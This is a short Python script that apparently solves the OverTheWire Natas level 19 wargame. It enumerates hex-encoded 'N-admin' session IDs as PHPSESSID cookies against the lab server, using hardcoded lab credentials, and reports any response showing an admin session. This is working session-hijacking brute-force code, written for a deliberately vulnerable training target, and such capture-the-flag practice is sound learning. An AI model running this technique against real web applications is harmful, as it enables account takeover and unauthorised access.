import requests
from binascii import hexlify


def encode(i):
    text = str(i) + "-admin"
    hex_encoded = hexlify(text.encode()).decode()
    return hex_encoded


for id in range(1, 641):
    pwn_cookie = {
        "PHPSESSID": f"{encode(id)}",
    }

    r = requests.post(
        "http://natas19.natas.labs.overthewire.org/",
        auth=("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"),
        data={
            "username": "",
            "password": "",
        },
        cookies=pwn_cookie,
    )

    if "regular user" not in r.content.decode():
        print(r.content.decode(), id)
